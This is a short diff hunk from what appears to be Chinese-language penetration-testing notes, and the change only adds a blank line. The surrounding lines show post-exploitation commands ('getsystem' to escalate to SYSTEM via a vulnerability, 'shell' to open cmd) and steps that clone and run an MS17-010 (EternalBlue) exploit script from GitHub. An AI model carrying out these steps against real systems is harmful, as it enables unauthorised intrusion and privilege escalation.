@@ -16,6 +16,7 @@ getsystem //通过系统漏洞进行get system权限
 shell //进入cmd
 
 git clone https://github.com/xaiJoker/MS17-010/
+
 cd ms17-010 && chmod +x ms17-010.sh
 
 Mac下使用：sh ms17-010.sh
